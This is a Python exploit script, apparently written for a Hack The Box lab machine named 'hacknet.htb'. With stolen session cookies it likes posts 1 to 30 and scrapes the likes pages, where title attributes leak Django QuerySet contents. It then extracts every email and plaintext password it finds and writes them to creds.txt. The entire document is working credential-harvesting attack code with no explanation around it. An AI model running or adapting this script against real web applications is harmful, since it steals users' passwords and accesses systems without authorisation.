import re, html, requests

U = "http://hacknet.htb"
H = {
    "Cookie": "csrftoken=<TOKEN>; sessionid=<SESSIONID>", # Change these variables
    "User-Agent": "Mozilla/5.0"
}

out = set()

for i in range(1, 31):
    requests.get(f"{U}/like/{i}", headers=H)
    r = requests.get(f"{U}/likes/{i}", headers=H).text

    imgs = re.findall(r'title="([^"]+)"', r)
    if not imgs:
        continue

    q = html.unescape(imgs[-1])

    if "<QuerySet" not in q:
        requests.get(f"{U}/like/{i}", headers=H)
        r = requests.get(f"{U}/likes/{i}", headers=H).text
        imgs = re.findall(r'title="([^"]+)"', r)
        if not imgs:
            continue
        q = html.unescape(imgs[-1])

    for e, p in zip(
        re.findall(r"'email': '([^']*)'", q),
        re.findall(r"'password': '([^']*)'", q)
    ):
        out.add(f"{e.split('@')[0]}:{p}")

with open("creds.txt", "w") as f:
    for line in sorted(out):
        f.write(line + "\n")

print("\n===== * Found Users * =====\n")
print("\n".join(sorted(out)))
print("\n[+] Saved to creds.txt")